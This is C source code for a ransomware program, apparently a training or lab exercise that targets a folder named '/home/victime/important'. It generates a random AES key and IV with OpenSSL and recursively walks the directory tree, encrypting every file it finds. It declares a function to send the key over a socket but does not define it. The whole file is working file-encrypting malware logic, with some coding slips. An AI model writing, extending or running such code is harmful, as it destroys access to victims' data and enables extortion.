#include "ransomlib.h"
#include <dirent.h>
// for socket
#include <sys/socket.h>
#include <unistd.h> 
#include <arpa/inet.h>
#include <openssl/rand.h>



void usage();

int is_encrypted(char *filename);

void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag);

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv);

int send_key(char *pKey, char *pIv);

int main (int argc, char * argv[])
{
	printf("Bon travail!\n");
	unsigned char key[33];
    int sizeKey = 33;
    unsigned char iv[33];
    int sizeIv = 33;
    char pKey[65];
    char pIv[65];
	int status = generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);
	listdir("/home/victime/important", iv, key, 'e');
}

int generate_key(unsigned char *key, int sizeKey, unsigned char *iv, int sizeIv,char *pKey, char *pIv)
{
	RAND_priv_bytes(key, sizeKey);
	RAND_priv_bytes(iv, sizeIv);
	bytes_to_hexa(key, pKey,sizeKey );
	bytes_to_hexa(iv, pIv, sizeKey);
}

void listdir(const char *name, unsigned char *iv, unsigned char *key, char de_flag)
{
	DIR *dp = opendir(name);
	struct dirent *dirp;

	while((dirp = readdir(dp)) != NULL)
    {
        if(dirp->d_type==DT_DIR && strcmp("..",dirp->d_name) != 0 && strcmp(".",dirp->d_name) != 0 )
        {
            //printf("%s\n", dirp->d_name);
            char *newPath = (char*)malloc(strlen(name)+strlen(dirp->d_name)+2);
            strcpy(newPath,name);
            strncat(newPath,"/",2);
            strncat(newPath,dirp->d_name,strlen(dirp->d_name));
            //printf("%s\n", newPath);
            listdir(newPath,iv, key, 'e');
            free(newPath);
            
            
            
        }
        else if(strcmp("..",dirp->d_name) != 0 && strcmp(".",dirp->d_name) != 0)
        {

            char *filePath = (char*)malloc(strlen(name)+strlen(dirp->d_name)+2);
            strcpy(filePath,name);
            strncat(filePath,"/",2);
            strncat(filePath,dirp->d_name,strlen(dirp->d_name));
            printf("%s\n",filePath);
            encrypt(key, iv, filePath);
            free(filePath);
            

            

        }




    }



}
